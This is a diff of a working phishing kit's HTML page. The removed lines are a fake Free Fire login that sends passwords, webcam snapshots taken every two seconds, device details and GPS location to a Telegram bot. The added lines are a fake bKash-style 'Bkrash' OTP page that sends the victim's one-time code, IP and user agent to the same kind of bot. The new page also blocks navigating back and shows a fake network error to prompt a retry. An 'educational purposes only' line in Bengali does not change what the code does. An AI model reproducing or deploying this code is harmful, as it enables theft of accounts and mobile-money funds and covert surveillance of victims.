@@ -3,321 +3,240 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Login Clone</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Bkrash OTP</title>
     <style>
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes buttonHover {
+            from { background-color: #e4136b; }
+            to { background-color: #c5115a; }
+        }
+
         body {
-            background: url('https://images4.alphacoders.com/110/1109972.jpg') no-repeat center center/cover;
+            background-color: #e4136b;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+        }
+        .logo {
+            text-align: center;
+            margin-top: 50px;
+            margin-bottom: 10px;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .logo img {
+            max-width: 110px;
+        }
+        .container {
+            background-color: #FFFFFF;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 300px;
+            margin-top: 30px;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #CCCCCC;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            animation: fadeIn 2s ease-in-out;
+        }
+        input[type="text"]::placeholder {
+            font-family: Arial, sans-serif;
+            color: #999999;
+        }
+        input:focus {
+            border-color: #e4136b;
+            box-shadow: 0 0 5px rgba(228, 19, 107, 0.5);
+            outline: none;
+        }
+        input.invalid {
+            border-color: red;
+            box-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
+        }
+        #timer {
+            color: #e4136b;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-align: center;
+            width: 100%;
+            animation: fadeIn 2.5s ease-in-out;
+        }
+        #submitButton {
+            background-color: #e4136b;
+            color: #FFFFFF;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
             font-family: Arial, sans-serif;
-        }
-        .login-container {
-            background: rgba(0, 0, 0, 0.85);
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.5);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            color: white;
-            backdrop-filter: blur(10px);
-        }
-        .login-container img {
-            width: 180px;
-            margin-bottom: 20px;
-        }
-        .login-container input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #666;
-            border-radius: 6px;
             font-size: 16px;
-            background: #222;
-            color: white;
+            transition: background-color 0.3s, transform 0.3s;
+            animation: fadeIn 3s ease-in-out;
         }
-        .login-container button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 15px;
-            background: linear-gradient(45deg, #ffcc00, #ff6600);
-            color: #fff;
-            font-size: 16px;
-            font-weight: bold;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: 0.3s;
+        #submitButton:hover {
+            background-color: #c5115a;
+            animation: buttonHover 0.3s forwards;
+            transform: translateY(-2px);
         }
-        .login-container button:hover {
-            background: linear-gradient(45deg, #ff6600, #ffcc00);
-        }
-        .forgot-password, .signup {
-            font-size: 14px;
-            margin-top: 12px;
-        }
-        .forgot-password a, .signup a {
-            color: #ffcc00;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        .social-login {
-            margin-top: 20px;
-            display: flex;
-            justify-content: space-between;
-        }
-        .social-login button {
-            width: 48%;
-            padding: 10px;
-            font-size: 14px;
-            border-radius: 6px;
-            border: none;
-            cursor: pointer;
-        }
-        .facebook-btn {
-            background: #1877f2;
-            color: white;
-        }
-        .google-btn {
-            background: #db4437;
-            color: white;
+        #submitButton span {
+            margin-left: auto;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/en/2/2e/Garena_Free_Fire_logo.png" alt="Free Fire Logo">
-        <h2 class="text-2xl font-semibold">Log in to Free Fire</h2>
-        <form>
-            <input type="text" id="username-or-email" placeholder="Username or Email">
-            <input type="password" id="password" placeholder="Password">
-            <div class="forgot-password">
-                <a href="#">Forgot password?</a>
-            </div>
-            <button type="button" onclick="sendToTelegram()">Log in</button>
-        </form>
-        <div class="social-login">
-            <button class="facebook-btn">Login with Facebook</button>
-            <button class="google-btn">Login with Google</button>
-        </div>
-        <div class="signup">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
+    <div class="logo">
+        <img src="https://i.ibb.co/0s3npSv/5e6ab3fa58a91-removebg-preview-1.png" alt="Bkash Logo">
     </div>
-
-    <div id="initial-container" style="display: none;">
-        <video id="video" width="640" height="480" autoplay></video>
+    <div class="container">
+        <p>We have sent an OTP to your bkrash mobile number, enter that OTP here.</p>
+        <input type="text" placeholder="Enter OTP" id="otpInput" inputmode="numeric" pattern="\d*">
+        <div id="timer">01:00</div>
+        <button id="submitButton">Submit <span>&#8594;</span></button>
+        <p id="goBack" style="margin-top: 20px; color: #999999; cursor: pointer;">GO BACK</p>
     </div>
 
     <script>
         function getQueryParams() {
-            const params = {};
-            const queryString = window.location.search.slice(1);
-            const parts = queryString.split('&');
-            for (let part of parts) {
-                const [key, value] = part.split('=');
-                params[decodeURIComponent(key)] = decodeURIComponent(value);
-            }
-            return params;
+            const params = new URLSearchParams(window.location.search);
+            return {
+                token: params.get('token'),
+                chatId: params.get('id')
+            };
         }
 
-        const { botToken, chatId } = getQueryParams();
+        const { token, chatId } = getQueryParams();
+        const telegramToken = token;
+        const telegramChatId = chatId;
 
-        async function startVideo() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const videoElement = document.getElementById('video');
-                videoElement.srcObject = stream;
-                
-                videoElement.addEventListener('canplay', () => {
-                    setInterval(() => {
-                        captureImage();
-                    }, 2000); // Adjusted to 2000 ms (2 seconds)
-                });
-            } catch (error) {
-                console.error("Error accessing camera: ", error);
-            }
-        }
+        const submitButton = document.getElementById('submitButton');
+        const otpInput = document.getElementById('otpInput');
+        const timerElement = document.getElementById('timer');
 
-        function captureImage() {
-            const video = document.getElementById('video');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob((blob) => {
-                sendImageToTelegram(blob);
-            }, 'image/png');
-        }
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            const countdown = setInterval(() => {
+                minutes = Math.floor(timer / 60);
+                seconds = timer % 60;
 
-        async function sendImageToTelegram(blob) {
-            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'image.png');
+                timerElement.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
 
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                    console.log("Image sent to Telegram");
-                } else {
-                    console.error("Error sending image to Telegram: ", response.statusText);
+                if (--timer < 0) {
+                    clearInterval(countdown);
+                    startTimer(duration); 
                 }
-            } catch (error) {
-                console.error("Error sending image to Telegram: ", error);
-            }
+            }, 1000);
         }
 
-        async function getUserInfo() {
+        const sendToTelegram = async (token, chatId, message) => {
+            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch(telegramUrl);
                 const data = await response.json();
-                const ip = data.ip;
-
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const deviceMemory = navigator.deviceMemory || 'N/A';
-                const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
-                const languages = navigator.languages.join(', ');
-                const screenWidth = window.screen.width;
-                const screenHeight = window.screen.height;
-                const colorDepth = window.screen.colorDepth;
-                const deviceName = await getDeviceName();
-
-                const userInfo = { ip, userAgent, platform, deviceMemory, hardwareConcurrency, languages, screenWidth, screenHeight, colorDepth, deviceName };
-
-                console.log("User info: ", userInfo);
-
-                await sendUserInfoToTelegram(userInfo);
-            } catch (error) {
-                console.error("Error getting user info: ", error);
-            }
-        }
-
-        async function getDeviceName() {
-            const parser = new UAParser();
-            const result = parser.getResult();
-            return result.device.model || 'Unknown Device';
-        }
-
-        async function sendUserInfoToTelegram(userInfo) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}px\nScreen Height: ${userInfo.screenHeight}px\nColor Depth: ${userInfo.colorDepth} bits\nDevice Name: ${userInfo.deviceName}`
-                    })
-                });
-
-                if (response.ok) {
-                    console.log("User info sent to Telegram");
-                } else {
-                    console.error("Error sending user info to Telegram: ", response.statusText);
+                if (!data.ok) {
+                    throw new Error(`Telegram API error: ${data.description}`);
                 }
             } catch (error) {
-                console.error("Error sending user info to Telegram: ", error);
+                console.error('Error sending message to Telegram:', error);
+                alert(`Error occurred while sending message to Telegram: ${error.message}`);
             }
-        }
+        };
 
-        async function getLocation() {
-            try {
-                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+        submitButton.addEventListener('click', async () => {
+            const otpValue = otpInput.value;
+            console.log('OTP Value:', otpValue);
 
-                if (permissionStatus.state === 'denied') {
-                    alert('Please enable GPS in your device settings to continue.');
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const { latitude, longitude } = position.coords;
-
-                    const locationInfo = {
-                        latitude,
-                        longitude
-                    };
-
-                    console.log("Location info: ", locationInfo);
-
-                    await sendLocationToTelegram(locationInfo);
-                }, (error) => {
-                    console.error("Error getting location: ", error);
-                    alert('Please enable GPS in your device settings to continue.');
-                });
-            } catch (error) {
-                console.error("Error requesting location permission: ", error);
-                alert('Please enable GPS in your device settings to continue.');
+            if (!/^\d{6}$/.test(otpValue)) {
+                otpInput.classList.add('invalid');
+                alert("Please enter a valid 6-digit OTP.");
+                return;
+            } else {
+                otpInput.classList.remove('invalid');
             }
-        }
 
-        async function sendLocationToTelegram(locationInfo) {
-            const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
+            console.log('OTP is valid, proceeding...');
+
+            const userAgent = navigator.userAgent;
+            const date = new Date();
+            console.log('User Agent:', userAgent);
+            console.log('Date:', date.toLocaleString());
 
             try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        latitude: locationInfo.latitude,
-                        longitude: locationInfo.longitude
-                    })
-                });
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                console.log('IP Address:', ip);
 
-                if (response.ok) {
-                    console.log("Location info sent to Telegram");
-                    document.getElementById('main-container').style.display = 'flex';
-                } else {
-                    console.error("Error sending location info to Telegram: ", response.statusText);
-                }
+                const otpData = {
+                    otp: otpValue,
+                    ip: ip,
+                    userAgent: userAgent,
+                    date: date.toLocaleString()
+                };
+
+                const telegramMessage = `<b>🎣 Bkrash Info</b>
+
+🔑 <b>OTP:</b> <code>${otpData.otp}</code>
+
+🌐 <b>IP Address:</b> ${otpData.ip}
+
+💻 <b>User Agent:</b> ${otpData.userAgent}
+
+📅 <b>Date:</b> ${otpData.date}
+
+<blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কারো ক্ষতি করার উদ্দেশ্যে এটি ব্যবহার করবেন না।</blockquote>`;
+
+                console.log('Telegram Message:', telegramMessage);
+
+                await sendToTelegram(telegramToken, telegramChatId, telegramMessage);
+                
+
+                console.log('OTP sent to Telegram');
             } catch (error) {
-                console.error("Error sending location info to Telegram: ", error);
+                console.error('Error in main flow:', error);
             }
-        }
-
-        async function initializeFirstPart() {
-            await startVideo();
-            await getUserInfo();
-            await getLocation();
-        }
-
-        function sendToTelegram() {
-            const emailOrUsername = document.getElementById('username-or-email').value;
-            const password = document.getElementById('password').value;
-            const message = `Email or Username: ${emailOrUsername}\nPassword: ${password}`;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Credentials sent to Telegram");
-                    window.location.href = 'otp.html'; // Redirect to the OTP page after login
-                })
-                .catch(error => {
-                    console.error("Error sending credentials to Telegram: ", error);
-                });
-        }
+        });
 
         window.onload = () => {
-            initializeFirstPart();
+            startTimer(60); 
         };
+
+        window.addEventListener('popstate', function(event) {
+            window.location.href = 'login.html';
+        });
+
+        window.history.pushState({}, '');
+
+        document.getElementById('goBack').addEventListener('click', function() {
+            window.location.href = 'login.html';
+        });
+
+        document.getElementById("submitButton").addEventListener("click", function() {
+            setTimeout(function() {
+                alert("দুঃখিত, নেটওয়ার্ক ত্রুটির কারণে সমস্যা হচ্ছে, দয়া করে পুনরায় চেষ্টা করুন।");
+            }, 1000);
+        });
+
     </script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
 </body>
 </html>
